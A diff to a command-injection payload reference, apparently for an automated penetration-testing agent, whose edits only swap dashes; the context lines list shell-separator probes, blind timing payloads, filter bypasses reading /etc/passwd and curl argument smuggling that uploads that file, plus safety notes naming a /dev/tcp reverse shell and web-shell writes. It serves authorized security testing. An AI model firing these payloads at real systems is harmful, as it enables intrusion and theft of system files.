@@ -1,4 +1,4 @@
-# payloads — command-injection-hunter
+# payloads - command-injection-hunter
 
 **Source:** `pentest-agent-development/notebooklm-notes/Guia Estratégico de Injeção de Comandos no Sistema Operacional.md` (Section 5: PAYLOADS / PROBES)
 
@@ -26,7 +26,7 @@ or to a process executor:
 || ls
 &  ls
 && ls
-\n ls                 # newline separator — %0a in URL encoding
+\n ls                 # newline separator - %0a in URL encoding
 ```
 
 Example full probes:
@@ -49,7 +49,7 @@ $(id)
 $(sleep 10)
 ```
 
-Useful when the app wraps input in quotes — command substitution still
+Useful when the app wraps input in quotes - command substitution still
 evaluates.
 
 ## 4. Windows Separators
@@ -59,7 +59,7 @@ evaluates.
 && ipconfig
 |  whoami
 || ping -n 5 127.0.0.1
-%0a whoami             # newline — Windows cmd rarely honours but worth trying
+%0a whoami             # newline - Windows cmd rarely honours but worth trying
 ```
 
 ## 5. Time-Based Blind
@@ -126,7 +126,7 @@ brace expansion, or tabs:
 ;cat$IFS'/etc/passwd'
 ;cat<>/etc/passwd
 ;{cat,/etc/passwd}
-;cat%09/etc/passwd           # tab — %09
+;cat%09/etc/passwd           # tab - %09
 ```
 
 ## 9. Argv-Mode (No Shell) Injection
@@ -136,15 +136,15 @@ When the app uses `subprocess.call(["curl", user_url])` without
 argument smuggling specific to the program:
 
 ```
-# curl — add -o to write response to a file
+# curl - add -o to write response to a file
 https://normal.example/ -o /tmp/pwned
 
-# curl — use @filepath to upload an arbitrary file
+# curl - use @filepath to upload an arbitrary file
 https://normal.example/ -F file=@/etc/passwd
 
-# find — -exec
+# find - -exec
 "; -exec cat {} ;
-# ffmpeg — file:/ protocol
+# ffmpeg - file:/ protocol
 file:/etc/passwd
 ```
 
@@ -207,7 +207,7 @@ curl -s "https://target/api/ping?host=127.0.0.1;id" | grep -iE "uid=|gid="
 
 ## Safety Notes
 
-- Timing-based probes should use 10-second sleeps, not 30-60s — avoids
+- Timing-based probes should use 10-second sleeps, not 30-60s - avoids
   false positives due to real latency and avoids holding connections.
 - OOB-based confirmation requires your OOB domain to be in
   `security-scope.yaml.allowed_oob_domains`.
@@ -215,6 +215,5 @@ curl -s "https://target/api/ping?host=127.0.0.1;id" | grep -iE "uid=|gid="
   -i >& /dev/tcp/...`, `> /var/www/shell.php`) without explicit
   `destructive_testing: approved`.
 - Remember: one confirmed injection point is enough for a finding.
-  Do NOT exhaustively try every separator on every parameter —
-  prioritize the highest-signal probes (`;id`, `` `id` ``, `$(id)`,
+  Do NOT exhaustively try every separator on every parameter -   prioritize the highest-signal probes (`;id`, `` `id` ``, `$(id)`,
   `|sleep 10`) and move on.
